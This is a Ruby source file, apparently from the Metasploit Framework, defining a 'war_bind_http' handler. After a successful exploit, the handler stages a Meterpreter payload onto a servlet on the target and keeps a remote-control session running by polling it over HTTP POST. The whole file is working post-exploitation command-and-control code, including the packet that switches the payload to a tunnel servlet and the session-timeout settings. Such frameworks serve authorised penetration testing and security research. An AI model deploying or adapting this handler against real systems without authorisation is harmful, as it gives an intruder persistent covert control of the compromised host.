require 'rex/io/stream_abstraction'
require 'rex/sync/ref'

module Msf
module Handler

# pseudo Rex::Proto:Http:ServerClient that can only send_response back to our dispatcher thread
class WarBindHttpCli
	def initialize(disp)
		@disp = disp
	end
	
	def send_response(resp)
		@disp.blob = resp.body
	end
end

# passive_dispatcher to be used by Rex::Post::Meterpreter::PacketDispatcher
class WarBindHttpDispatcher
	def initialize(framework, host, port, url, init_blob)
		@framework = framework
		@shutdown = false
		self.blob = init_blob
		@host = host
		@port = port
		@url = url
		@state = 0
		@session_id = [0].pack('N')
	end
	
	def remove_resource(name)
		if @state == 0
			@state = 1
		elsif @state == 2
			@shutdown = true
		else
			raise RuntimeError, "Unexpected remove_resource in state #{@state}"
		end
	end
	
	def add_resource(name, opts)
		if @state == 1
			@state = 2
			@proc = opts["Proc"]
			@poll_thread = @framework.threads.spawn("WarBindHttpPollThread-#{@host}:#{@port}/#{@url}", false) {
				while ! @shutdown
					c = Rex::Proto::Http::Client.new(@host, @port)
					r = c.request_cgi({
						'uri'          => @url,
						'method'       => 'POST',
						'ctype'        => 'application/octet-stream',
						'data'         => @session_id + self.blob,
					})
					res = c.send_recv(r,20)
					c.close()
					if (! res or res.code < 200 or res.code >= 300)
						raise RuntimeError, "Upload failed"
					end
					req = Rex::Proto::Http::Request.new()
					@session_id = res.body[0..3]
					req.body = res.body[4..-1]
					cli = WarBindHttpCli.new(self)
					self.blob = ""
					@proc.call(cli,req)
				end
			}
		else
			raise RuntimeError, "Unexpected add_resource in state #{@state}"
		end
	end
	
	def close_client(cli)
	end
	
	attr_accessor :blob
end

###
#
# This handler implements the HTTP tunneling interface to a servlet.
#
###
module WarBindHttp

	include Msf::Handler

	#
	# Returns the string representation of the handler type, in this case
	# 'war_bind_http'.
	#
	def self.handler_type
		return "war_bind_http"
	end

	#
	# Returns the connection-described general handler type, in this case
	# 'tunnel'.
	#
	def self.general_handler_type
		"tunnel"
	end
	
	#
	# Initializes the HTTP tunneling handler.
	#
	def initialize(info = {})
		super

		register_options(
			[
				Opt::RHOST,
				Opt::RPORT(80),
				OptString.new('SERVLETURI', [ true,  "The URI of the servlet to connect to.", '/test/'])
			], Msf::Handler::WarBindHttp)

		register_advanced_options(
			[
				OptInt.new('SessionExpirationTimeout', [ false, 'The number of seconds before this session should be forcible shut down', (24*3600*7)]),
				OptInt.new('SessionCommunicationTimeout', [ false, 'The number of seconds of no activity before this session should be killed', 300])
			], Msf::Handler::WarBindHttp)
	end
	
	#
	# Run the handler after the exploit has succeeded.
	#
	def handler(sock)
		classname = "metasploit.PayloadTunnelServlet\x00"
		blob = ""
		blob << self.generate_stage

		# This is a TLV packet - I guess somewhere there should be API for building them
		# in Metasploit :-)
		packet = ""
		packet << ["core_switch_call\x00".length + 8, 0x10001].pack('NN') + "core_switch_call\x00"
		packet << [classname.length+8, 0x1000a].pack('NN')+classname
		packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
		packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
		blob << [packet.length+8, 0].pack('NN') + packet
		
		disp = WarBindHttpDispatcher.new(framework, datastore['RHOST'], datastore['RPORT'], datastore['SERVLETURI'], blob)

		# Short-circuit the payload's handle_connection processing for create_session
		create_session(nil, {
			:passive_dispatcher => disp,
			:conn_id            => '',
			:expiration         => datastore['SessionExpirationTimeout'].to_i,
			:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
			:ssl                => false
		})
	end
end
end
end
